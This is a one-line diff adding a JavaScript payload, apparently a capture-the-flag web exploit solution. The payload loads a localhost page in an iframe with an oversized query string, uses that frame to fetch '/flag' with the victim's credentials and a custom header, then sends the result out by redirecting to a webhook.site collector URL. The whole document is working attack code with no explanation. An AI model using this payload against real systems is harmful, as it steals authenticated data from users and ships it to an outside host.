@@ -1,0 +1,1 @@
+var f=document.createElement('iframe');f.src=`http://localhost:3000/js/index.js?q=${'a'.repeat(20000)}`;f.onload=()=>{f.contentWindow.fetch('/flag',{headers:{'X-FLAG':'a'},credentials:'include'}).then(res=>res.text()).then(flag=>location='https://webhook.site/ea251b8e-f556-410a-89bc-1bb256bae5f7?q='+flag)};document.body.appendChild(f);
